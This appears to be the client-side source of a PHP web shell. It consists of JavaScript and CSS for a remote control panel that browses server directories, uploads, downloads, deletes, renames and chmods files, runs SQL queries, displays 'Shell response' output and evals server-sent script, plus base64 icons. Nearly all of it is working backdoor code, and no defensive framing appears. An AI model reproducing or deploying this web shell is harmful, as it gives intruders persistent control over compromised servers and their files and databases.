	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.getElementById("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
	function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
	"&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=
	sorttable.l;for(c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=
	a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(b="",c=0;c<a.childNodes.length;c++)b+=
	sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?
	-1:1},g:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];m=mtch[2];d=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},m:function(a,b){mtch=a[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&(d="0"+d);dt1=y+m+d;mtch=b[0].match(sorttable.a);y=mtch[3];d=mtch[2];m=mtch[1];1==m.length&&(m="0"+m);1==d.length&&
	(d="0"+d);dt2=y+m+d;return dt1==dt2?0:dt1<dt2?-1:1},r:function(a,b){for(c=0,e=a.length-1,g=h;g;){for(g=j,f=c;f<e;++f)0<b(a[f],a[f+1])&&(g=a[f],a[f]=a[f+1],a[f+1]=g,g=h);e--;if(!g)break;for(f=e;f>c;--f)0>b(a[f],a[f-1])&&(g=a[f],a[f]=a[f-1],a[f-1]=g,g=h);c++}}};
	n=1;function p(a){b=h;a||(a=((this.ownerDocument||this.document||this).parentWindow||window).event,a.preventDefault=q,a.stopPropagation=r);c=this.b[a.type],e;for(e in c)this.h=c[e],this.h(a)===j&&(b=j);return b}function q(){this.returnValue=j}function r(){this.cancelBubble=h}Array.forEach||(Array.forEach=function(a,b,c){for(e=0;e<a.length;e++)b.call(c,a[e],e,a)});
	Function.prototype.forEach=function(a,b,c){for(e in a)"undefined"==typeof this.prototype[e]&&b.call(c,a[e],e,a)};String.forEach=function(a,b,c){Array.forEach(a.split(""),function(e,g){b.call(c,e,g,a)})};function l(a,b){if(a){c=Object;if(a instanceof Function)c=Function;else{if(a.forEach instanceof Function){a.forEach(b,void 0);return}"string"==typeof a?c=String:"number"==typeof a.length&&(c=Array)}c.forEach(a,b,void 0)}};

	function append(e, c){
		o = d.getElementById(e);
		if (o) o.innerHTML += c;
	}
	
	function appendr(e, c){
		o = d.getElementById(e);
		if (o) o.innerHTML = c + o.innerHTML;
	}

	function remove(e){
		o = d.getElementById(e);
		if (o) o.parentNode.removeChild(o);
	}

	function empty(e){
		o = d.getElementById(e);
		if (o) o.innerHTML = null;
	}
	
	function serialize(form){
		var i, j, q = [];
		if (!form || form.nodeName !== "FORM") return;
		for (i = form.elements.length - 1; i >= 0; i = i - 1){
			if (form.elements[i].name === "") continue;
			switch (form.elements[i].nodeName){
				case 'INPUT':
					switch (form.elements[i].type){
						case 'text':
						case 'hidden':
						case 'password':
						case 'button':
						case 'reset':
						case 'submit':
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
						case 'checkbox':
						case 'radio':
							if (form.elements[i].checked) q.push(form.elements[i].name + "=" + euc(form.elements[i].value));				
							break;
						case 'file':
							break;
					}
					break;			 
				case 'TEXTAREA':
					q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
					break;
				case 'SELECT':
					switch (form.elements[i].type){
						case 'select-one':
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
						case 'select-multiple':
							for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1){
								if (form.elements[i].options[j].selected) q.push(form.elements[i].name + "=" + euc(form.elements[i].options[j].value));
							}
							break;
					}
					break;
				case 'BUTTON':
					switch (form.elements[i].type){
						case 'reset':
						case 'submit':
						case 'button':
							q.push(form.elements[i].name + "=" + euc(form.elements[i].value));
							break;
					}
					break;
			}
		}
		return q.join("&");
	}
	
	function ajax(p, cf){
		var ao = {};
		lastAjax = p;
		ao.cf = cf;
		ao.request = new XMLHttpRequest();
		ao.bindFunction = function (caller, object){
			return function (){
				return caller.apply(object, [object]);
			};
		};
		ao.stateChange = function (object){
			if (ao.request.readyState == 4) ao.cf(ao.request.responseText);
		};
		if (window.XMLHttpRequest){
			req = ao.request;
			req.onreadystatechange = ao.bindFunction(ao.stateChange, ao);
			req.open("POST", targeturl, true);
			req.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
			req.setRequestHeader('content-Type', 'application/x-www-form-urlencoded');
			req.setRequestHeader('Connection', 'close');
			req.send(p);
		}
		return ao;
	}

	function htmlsafe(s){
		if(typeof(s) == "string"){
			s = s.replace(/&/g, "&amp;");
			s = s.replace(/"/g, "&quot;");
			s = s.replace(/'/g, "&#039;");
			s = s.replace(/</g, "&lt;");
			s = s.replace(/>/g, "&gt;");
		}
		return s;
	}

	function dpath(e, t){
		if (t)
			return d.getElementById("base").value + e.parentNode.parentNode.getAttribute("data-path");
		else
			return e.parentNode.parentNode.getAttribute("data-path");
	}

	//TODO removeEventListener
	function drag_start(){
		if(!onDrag){
			onDrag = true;
			//d.removeEventListener("mousemove", function(e){}, false);
			d.addEventListener("mousemove", function(e){
				dragX = e.pageX;
				dragY = e.pageY;
			}, false);
			setTimeout("drag_loop()", 50);
		}
	}

	function drag_loop(){
		if (onDrag){
			x = dragX - dragDeltaX;
			y = dragY - dragDeltaY;
			if (x < 0) x = 0;
			if (y < 0) y = 0;
			o = d.getElementById("box").style;
			o.left = x + "px";
			o.top = y + "px";
			setTimeout("drag_loop()", 50);
		}
	}

	function drag_stop(){
		onDrag = false;
		//d.removeEventListener("mousemove", function(e){}, false);
	}

	function show_box(t, ct){
		hide_box();
		box = "<div id='box' class='box'><p id='boxtitle' class='boxtitle'>"+t+"<span onclick='hide_box();' class='boxclose floatRight'>x</span></p><div class='boxcontent'>"+ct+"</div></div>";
		append("content", box);

		x = (d.body.clientWidth - d.getElementById("box").clientWidth)/2;
		y = (d.body.clientHeight - d.getElementById("box").clientHeight)/2;
		if (x < 0) x = 0;
		if (y < 0) y = 0;
		dragX = x;
		dragY = y;
		o = d.getElementById("box").style;
		o.left = x + "px";
		o.top = y + "px";
			
		d.addEventListener("keyup", function (e){
			if (e.keyCode === 27) hide_box();
		});
		
		d.getElementById("boxtitle").addEventListener("click", function(e){
			e.preventDefault();
			if (!onDrag){		
				dragDeltaX = e.pageX - parseInt(o.left);
				dragDeltaY = e.pageY - parseInt(o.top);
				drag_start();
			} else drag_stop();
		}, false);

		//if ($('.box input')[0]) $('.box input')[0].focus();
	}

	function hide_box(){
		onDrag = false;
		//d.removeEventListener("keyup", function(e){}, false);
		remove("box");
		remove("dlf");
	}

	function ajaxLoad(p){
		empty("content");
		append("content", "<div class='loading'></div>");
		ajax(p, function(r){
			empty("content");
			append("content", r);
			updateui();
			lastLoad = p;
		});
	}
	
	function updateui(){
		o = d.getElementById("jseval");
		if (o) eval(o.value);
		o = d.getElementById("sort");
		if (o) sorttable.k(o);
		o = d.getElementById("etime");
		if (o) d.getElementById("uetime").innerHTML = o.value;
	}
	
	function viewSize(f){
		f.innerHTML = "<div class='loading loadingmini'></div>";
		ajax("me=file&md=vs&f=" + euc(dpath(f, true)), function(r){
			f.innerHTML = r;
		});
	}

	function godir(f, t){
		ajaxLoad("me=file&dir=" + euc(dpath(f, t)));
	}
	
	function godisk(f){
		ajaxLoad("me=file&dir=" + euc(f.getAttribute("data-path")));
	}
	
	function godirui(){
		ajaxLoad("me=file&dir=" + euc(d.getElementById("goui").value));
	}
	
	function showUI(a, o){
		path = dpath(o, false);
		datapath = dpath(o, true);
		disabled = "";
		text = "<?php echo tText('name', 'Name'); ?>";
		btitle = "<?php echo tText('go', 'Go!'); ?>";

		if (a === "del"){
			disabled = "disabled";
			title = "<?php echo tText('del', 'Del'); ?>";
		} else if (a === "ren"){
			title = "<?php echo tText('rname', 'Rename'); ?>";
		} else if (a === "mpers"){
			path = o.innerHTML.substring(17, 21);
			title = "<?php echo tText('chmodchown', 'Chmod/Chown'); ?>";
			text = title.substring(0, 5);
		} else if (a === "mdate"){
			path = o.innerHTML;
			title = "<?php echo tText('date', 'Date'); ?>";
			text = title;
		} else if ((a === "cdir") || (a === "cfile")){
			path = "";
			datapath = d.getElementById("base").value;
			title = "<?php echo tText('createdir', 'Create directory'); ?>";
			if (a === "cfile") title = "<?php echo tText('createfile', 'Create file'); ?>";
		}
	
		ct = "<table class='boxtbl'><tr><td class='colFit'>" + text + "</td><td><input id='uival' name='uival' type='text' value='" + path + "' " + disabled + "></td></tr><tr data-path='" + datapath + "'><td colspan='2'><span class='button' onclick='processUI(&quot;" + a + "&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);'>" + btitle + "</span></td></tr></table>";
		show_box(title, ct);
	}	
	
	function showUISec(a, o){
		btitle = "<?php echo tText('go', 'Go!'); ?>";
		uival = "";
		n = "&quot;&quot;";
		s = serialize(d.forms[0]).replace(/chkall=&/g, "");
		s = s.substring(0, s.indexOf("&goui=")); 

		if (a === "comp"){
			title = "<?php echo tText('download', 'Download'); ?>";
		} else if (a === "copy"){
			title = "<?php echo tText('copy', 'Copy'); ?>";
			uival = "<tr><td class='colFit'><?php echo tText('to', 'To') ?></td><td><input id='uival' name='uival' type='text' value=''></td></tr>";
			n = "d.getElementById(&quot;uival&quot;).value";
		} else if (a === "rdel"){
			title = "<?php echo tText('del', 'Del'); ?>";
		}

		ct = "<table class='boxtbl'>" + uival + "<tr><td colspan='2'><textarea disabled='' wrap='off' style='height:120px;min-height:120px;'>" + decodeURIComponent(s).replace(/&/g, "\n") + "</textarea></td></tr><tr><td colspan='2'><span class='button' onclick='processUI(&quot;" + a + "&quot;, &quot;&" + s + "&fl=" + euc(d.getElementById("base").value) + "&quot;, " + n + ");'>" + btitle + "</span></td></tr></table>";
		if (a === "comp" && s.length > 2000) ct += "<div class='boxresult'>WARNING the GET request is > 2000 chars</div>";
		show_box(title, ct);
	}
	
	function processUI(a, o, n){
		if (a === "comp"){
			hide_box();
			append("content", "<iframe id='dlf' class='hide' src='" + targeturl + "?me=file&md=tools&ac=comp&" + o + "'></iframe>");
		} else {
			if (a !== "rdel" && n === "") return;
			if (a !== "copy" && a !== "rdel") o = euc(o);
			if (a === "ren") n = d.getElementById("base").value + n;
			ajax("me=file&md=tools&ac=" + a + "&a=" + o + "&b=" + euc(n), function(r){
				if (r === "OK"){
					hide_box();
					ajaxLoad(lastLoad);
				} else append("box", "<div class='boxresult'>" + r + "</div>");
			});
		}
	}
	
	function dl(o){
		remove("dlf");
		append("content", "<iframe id='dlf' class='hide' src='" + targeturl + "?me=file&md=tools&ac=dl&fl=" + euc(dpath(o, true)) + "'></iframe>");
	}
	
	function up(){
		ct = "<form name='up' enctype='multipart/form-data' method='post' action='<?php echo $self; ?>'><input type='hidden' value='file' name='me'><input type='hidden' value='up' name='ac'><input type='hidden' value='" + d.getElementById("base").value + "' name='dir'><table class='boxtbl'><tr><td class='colFit'><?php echo tText('file', 'File'); ?></td><td><input name='upf' value='' type='file' /></td></tr><tr><td colspan='2'><span class='button' onclick='document.up.submit()'><?php echo tText('go', 'Go!'); ?></span></td></tr></table></form>";
		show_box("<?php echo tText('upload', 'Upload'); ?>", ct);
	}
	
	function uiupdate(t){
		ajax(serialize(d.forms[t]), function(r){
			//remove("uires");
			appendr("content", "<div id='uires' class='uires'><?php echo tText('sres', 'Shell response'); ?>: " + r + "</div>");
		});
	}

	function dbexec(c){
		empty("dbRes");
		append("dbRes", "<div class='loading'></div>");
		ajax(serialize(d.forms[0]) + '&sqlcode=' + c, function(r){
			empty("dbRes");
			append("dbRes", r);
			updateui();
		});
	}	
	
	function dbengine(t){
		d.getElementById("su").className = "hide";
		d.getElementById("sp").className = "hide";
		d.getElementById("so").className = "hide";
		
		if ((t.value === "odbc") || (t.value === "pdo")){
			d.getElementById("sh").innerHTML = "<?php echo tText('sq5', 'DSN/Connection String'); ?>";
			d.getElementById("su").className = "";
			d.getElementById("sp").className = "";
		} else if ((t.value === "sqlite") || (t.value === "sqlite3")){
			d.getElementById("sh").innerHTML = "<?php echo tText('sq6', 'DB File'); ?>";
		} else {
			d.getElementById("sh").innerHTML = "<?php echo tText('sq7', 'Host'); ?>";
			d.getElementById("su").className = "";
			d.getElementById("sp").className = "";
			d.getElementById("so").className = "";
		}
	}
	
	function CheckAll(form){
		for(i = 0; i < form.elements.length; i++){
			e = form.elements[i];
			if (e.name != "chkall") e.checked = form.chkall.checked;
		}
	}
		
	function toggle(b){
		if (d.getElementById(b)){
			if (d.getElementById(b).style.display == "block") d.getElementById(b).style.display = "none";
			else d.getElementById(b).style.display = "block"
		}
	}
	
	function change(l, b){
		d.getElementById(l).style.display = 'none';
		d.getElementById(b).style.display = 'block';
		if (d.getElementById('goui')) d.getElementById('goui').focus();
	}
	
	function hilite(e){
		c = e.parentElement.parentElement;
		if (e.checked) 
			c.className = "mark";
		else 
			c.className = "";
		
		a = d.getElementsByName("cbox");
		b = d.getElementById("total_selected");
		c = 0;
		
		for (i = 0;i<a.length;i++) 
			if(a[i].checked) c++;
			
		if (c==0) 
			b.innerHTML = "";
		else 
			b.innerHTML = " ( selected : " + c + " items )";
	}

	ajaxLoad("me=file");
	  </script>
	  <style type="text/css">
		*{
			box-sizing: border-box;
			color: #fff;
			font-family: verdana;
			text-decoration: none;
		}
		body{
			background-color: #000;
		}
		body, td, th{
			color: #d9d9d9;
			font-size: 11px;
		}
		td{
			font-size: 8pt;
			color: #ebebeb;
		}
		td.header{
			font-weight: normal;
			font-size: 10pt;
			background: #7d7474;
		}
		a{
			font-weight: normal;
			color: #dadada;
		}
		a.links{
			text-decoration: none;
		}
		a:hover{
			text-decoration: underline;
		}
		input, textarea, button, select, option{
			background-color: #800000; 
			border: 0; 
			font-size: 8pt;  
			font-family: Tahoma;
			padding: 3px;
			margin: 3px;
		}
		p{
			margin-top: 0px;
			margin-bottom: 0px; 
			size-height: 150%
		}
		table.sortable tbody tr:hover td{
			background-color: #8080FF;
		}
		table.sortable tbody tr:nth-child(2n), .alt1{
			background-color: #7d7474;
		}
		table.sortable tbody tr:nth-child(2n+1), .alt2{
			background-color: #7d7f74;
		}
		pre{
			font: 9pt Courier, Monospace;
		} 
		.bigarea{
			height: 220px; 
			width: 100%;
		}
		.ml1{
			border:1px solid #444; 
			padding:5px;
			margin:0;
			overflow: auto;
		} 
		.notif{
			border-radius: 6px 6px 6px 6px;
			font-weight: 700;
			margin: 3px 0;
			padding: 4px 8px 4px;
		}
		.uiinfo{
			display: none;
			border: 1px solid #800000;
			border-radius: 6px 6px 6px 6px;
			margin: 4px 0;
			padding: 8px;
			width: 100%;
		}
		.explore{
			width:100%;
			border-collapse:collapse;
			border-spacing:0;
		}
		.explore a{
			text-decoration:none;
		}
		.explore td{
			padding:5px 10px 5px 5px;
		}
		.explore th{
			font-weight:700;
			background-color:#222;
		}
		.explore tbody tr:hover, .mark{
			background-color:#8080FF;
		}
		.box{
			min-width:50%;
			border:1px solid #fff;
			padding:8px 8px 0 8px;
			position:fixed;
			background:#000;
			box-shadow:1px 1px 25px #150f0f;
			opacity:0.96;
		}
		.boxtitle{
			background:#7d7474;
			font-weight:bold;
			text-align:center;
			cursor:pointer;
			padding: 3px;
		}
		.boxtitle a, .boxtitle a:hover{
			color:#aaa;
		}
		.boxsBuff{
			padding:2px 0 2px 0;
		}
		.boxresult{
			padding:4px 10px 6px 10px;
			border-top:1px solid #222;
			margin-top:4px;
			text-align:center;
		}
		.boxtbl{
			border:1px solid #222;
			border-radius:8px;
			padding-bottom:8px;
		}
		.boxtbl td{
			vertical-align:middle;
			padding:8px 15px;
			border-bottom:1px dashed #222;
		}
		.boxtbl input, .boxtbl select, .boxtbl textarea, .boxtbl, .button{
			width:100%;
		}
		.boxlabel{
			text-align: center;
			border-bottom:1px solid #222;
			padding-bottom:8px;
		}
		.boxclose{
			background:#222;
			padding:2px;
			margin-right:2px;
			padding:0 4px;
			cursor:pointer;
		}
		.button{
			min-width:120px;
			color:#fff;
			background:#800;
			border:none;
			padding:6px;
			display:block;
			text-align:center;
			float:left;
			cursor:pointer;
		}
		.button:hover, #ulDragNDrop:hover{
			background:#820;
		}
		.floatLeft{
			float:left;
		}
		.floatRight{
			float:right;
		}
		.colFit{
			width:1px;
			white-space:nowrap;
		}
		.colSpan{
			width:100%;
		}
		.loading {
			margin-left: auto;
			margin-right: auto;
			background-color: rgba(0,0,0,0);
			border: 5px solid #800;
			opacity: .9;
			border-top: 5px solid rgba(0,0,0,0);
			border-left: 5px solid rgba(0,0,0,0);
			border-radius: 50px;
			box-shadow: 0 0 35px #800;
			width: 50px;
			height: 50px;
			margin: 0 auto;
			-moz-animation: spin .5s infinite linear;
			-webkit-animation: spin .5s infinite linear;
		}
		.loadingmini {
			border: 2px solid #800;
			border-top: 2px solid rgba(0,0,0,0);
			border-left: 2px solid rgba(0,0,0,0);
			border-radius: 10px;
			box-shadow: 0;
			width: 15px;
			height: 15px;
		}
		@-moz-keyframes spin {
			0% {-moz-transform: rotate(0deg);}
			100% {-moz-transform: rotate(360deg);};
		}
		@-moz-keyframes spinoff {
			0% {-moz-transform: rotate(0deg);}
			100% {-moz-transform: rotate(-360deg);};
		}
		@-webkit-keyframes spin {
			0% {-webkit-transform: rotate(0deg);}
			100% {-webkit-transform: rotate(360deg);};
		}
		@-webkit-keyframes spinoff {
			0% {-webkit-transform: rotate(0deg);}
			100% {-webkit-transform: rotate(-360deg);};
		}	
		
		.hide{
			display:none;
			margin:0;
			padding:0;
		}
			
		.my{color:yellow;}
		.mg{color:green;}
		.mr{color:red;}
		.mw{color:white;}
		
		.stdui{
			padding:6px;
		}
		
		.uires{
			border: 1px solid #ddd; 
			padding: 15px;
			margin: 10px;
			text-align: center;
			font-weight: bold;
		}
		
		.image{
			width:16px;
			height:16px;
			cursor:pointer;
			display:block;
			float:left;
			margin-right:3px;
		}
	
		.asp{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAOBAMAAADUAYG5AAAAHlBMVEX29/fX09Pk4+PKlJPAODWUBgXftbTAW1iuDw3ReXeTvAtzAAAAV0lEQVR4AWPAA1JcwMCJYUanR6dJp2UbQ4WDxbRiR8dihlLLDLd0p0nODBVqmiVFhSXBDOWpZYXJbqHBDFNDQ0NbQ0PDGISNwcCIQQkKGBQFIYABSosBAKxPGDO5nrSTAAAAAElFTkSuQmCC") no-repeat;}
		.avi{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXH////AwMCAgIAAAAD/AACxZc2lAAAAAXRSTlMAQObYZgAAAFRJREFUeF5FzMERwCAIRNFtgRICFGAiuUfd/msKyej4T++wAKBmBdkpIrZwlAlyQhxloVoeSXVE124jHA+p1tyBS9UYiVv7aEwEySa+/2zkOvvAvxdlbRDkNPgrwgAAAABJRU5ErkJggg==") no-repeat;}
		.cgi{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH/2zL06Jebagh4d3WxiDBNS0rcsBxqIGFJAAAAAXRSTlMAQObYZgAAAGtJREFUeAFjAAJmBigwNoAyDKEM5sBgFAazsXFhsbExA4ORkpKgkJKSCYO5kKCgkGCpCQNLuKCgkmiaAwODS6GgUlgKUDWLopBimANIm6C4YhmEERYkGgBkGJWmuKqHABmmQB2hIAaLCxgDALfSD/3zyHbnAAAAAElFTkSuQmCC") no-repeat;}
		.cmd{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH///+AgIAAAADAwMAAAICAgAD//wBP2DYPAAAAAXRSTlMAQObYZgAAAENJREFUeAFjgAMlKGBQcQEDZQaVUDCAMISFhYEMiBIgQxAMwIw0QyjDPBnCECtSToSImBRDpYRBahC6lGDmGEMB3BUAQQYRh0ILDgoAAAAASUVORK5CYII=") no-repeat;}
		.copy{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHr8ffC4f6v1PF7nrqOwutWbYw/SVvnK+2gAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjgANm4xAXBzBDUFAwDMwQUgaJgRjGEDFWoWAhJcXQBAYWMEMQxAgVUlI2BDFChJSMDQvADGUUBpugiZCxaSBQJC0FwmAAigkKCgMZQLH08vIEuCsAm2MSZ1K+LZgAAAAASUVORK5CYII=") no-repeat;}
		.cpp{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXH///8AAIDAwMCAgIAAAACRQaxqAAAAAXRSTlMAQObYZgAAAEVJREFUeAFjYHEBAgcGBgYWQSAwgTEMHKCM0FAoQ9AUxFBSFFQEMYQUlYSUoAyYCFANXAShBqELYQ6CYQwCQAZrKBgwAACCmg2Bo41i4wAAAABJRU5ErkJggg==") no-repeat;}
		.del{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEWeAgKfHx7NlZXCf36mSUm3YGDQAADTnp94I1VJAAAABnRSTlP+8AJGi/pSC0zeAAAAcUlEQVR4Xi2J0QnCQBBERyJ+qwkW8PYK8A4swANiAXLk10DYCrz+XYIPGN7MiFTAKuL1hscXpaUXW3rVs7UxtzYpX3YmmXaquCs4IuwcUv9yKIh8cvcB2c2DT1GOjG3Q7L5FWZXca9yjmDfIKyJVsCs/V0YYHsrbmCoAAAAASUVORK5CYII=") no-repeat;}
		.dir{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAGFBMVEVMaXH//5zOzmOcnAAAAAD//87/zpz39/cJIMBEAAAAAXRSTlMAQObYZgAAAEtJREFUeAFjIAyYjY0doEzzUEETqKCSkpKysbEBiBkKAoEqIGagIBCIwZmJiXCmGFw0ESEqBhMFCaaBmWFiQABhKoEBiMngAgEMDABNLxCJtl4npgAAAABJRU5ErkJggg==") no-repeat;}
		.doc{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEVMaXEAAP/////AwMAAAACAgIDs+4PxAAAAAXRSTlMAQObYZgAAAFxJREFUeF4ljcENgDAMA/1hgdIFEjpB2wFI1AEQgv1XwQn3Op1kGdhecoGi5AFqoPcJZxBd6y+jT5ibmFJKqW12ipuZhJQ69zayiIsqC+dZLGDJi4MlhYSMIGQlH9rmFP/olcG8AAAAAElFTkSuQmCC") no-repeat;}
		.download{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHy+PxRf7vD3Pdyotucv+mOxGHP8pZRJPvxAAAAAXRSTlMAQObYZgAAAGlJREFUeAE1yTESQUEQhOEuxQH68UiZ3T0AQ85WuwAcQCIXub7ZxR991Q1Mb4oAzBgdjsCZrX3DllyMQJp7YNfhPqyBjUumjjSSl4Yy/EGydkiqmJyuP2R9r0yW5fMRy93T6v0KmFmW2Qe9LBLI5TPE4QAAAABJRU5ErkJggg==") no-repeat;}
		.edit{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHM4vlAesHy9fTu0HO/jEje0bNiuvgtn6IlAAAAAXRSTlMAQObYZgAAAGVJREFUeAElzcENgCAMQNHGDRoTuBI2MBIdQOCsEXQA6wQeWN+2/NNLm7QAXgKAYeasY0yIuJS9g55XYXLuoJB0ZbaYnIBCvAQmxzQKiOKhOGtFwVrS3T4BD1BgGyfgg/yWv3oNfvxKFuu6ZIarAAAAAElFTkSuQmCC") no-repeat;}
		.exe{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAOBAMAAAA/Njq6AAAAElBMVEVMaXGEhITGxsb///8AAAAAAL3QMzG6AAAAAXRSTlMAQObYZgAAADdJREFUeAFjYBSEAAEGBkYlMFB0ADJVQ0EgEMoMdnZ2BDEVIWpBTGVjEDCkDlMQbi6LCwQ4MAAAGdsU7SMxZ3cAAAAASUVORK5CYII=") no-repeat;}
		.htaccess{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH/AAD/AP8AAIAAAACAAID//wAh7q3vAAAAAXRSTlMAQObYZgAAAEhJREFUeAFjSAtggIC0QCiDNVQAyhJRhDKEjAQhDEZnRQEIQwUmJGQMFRJUdhKEyCGEVIwUIUJKzkYwIWMGqKoQByhLwIUBBgAzAQdHwl34ZQAAAABJRU5ErkJggg==") no-repeat;}
		.html{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAGFBMVEVMaXFIXpDA1vuEuNwumeJzc3P2+/9fl8ofnhI8AAAAAXRSTlMAQObYZgAAAHtJREFUeF41yr0Kg0AQhdGB/FhfY0idTbB3N6xtBgZsbfIEytZBwXn9uLPkqw6XS0Rh70tWTCnpnw9fv4296oxbVrWGYUr3cac+RbbCrYsyGKtJVLjNPL8YgPHQsXets4NI3bDxODfSX8oaGfBGWpfgXSEBVwDG0yc30g+Tqhs347zYeAAAAABJRU5ErkJggg==") no-repeat;}
		.info{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHW4/Gcuty90upmkL57o87x9fo/cKp6YdxCAAAAAXRSTlMAQObYZgAAAGxJREFUeAFjQAbGxhDaUFBQCEQzCyopCSqABEQVhYJBQoKhaWmhQFVMQqHCZiaKAQxMoiHOaSqBDkCGi5uIi6MDA6uQCxAARRiMQ9xSXIyAuhxNnFSczIEMFuMQV+MCkNFFgoLqEMvKy5GdAAAtjxBWRk6H0AAAAABJRU5ErkJggg==") no-repeat;}
		.ini{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH////AwMAAAACAgICAgAD//wBJC4D8AAAAAXRSTlMAQObYZgAAAERJREFUeAFjYGAWBgIGIDB0BAIDBgYWYTAAMgRBQBmFYWxojC5iDBMRCoKKqKYaQkTCzALRRISDUbUrgQCQwWAMAgYMAE/+DM0VyVW8AAAAAElFTkSuQmCC") no-repeat;}
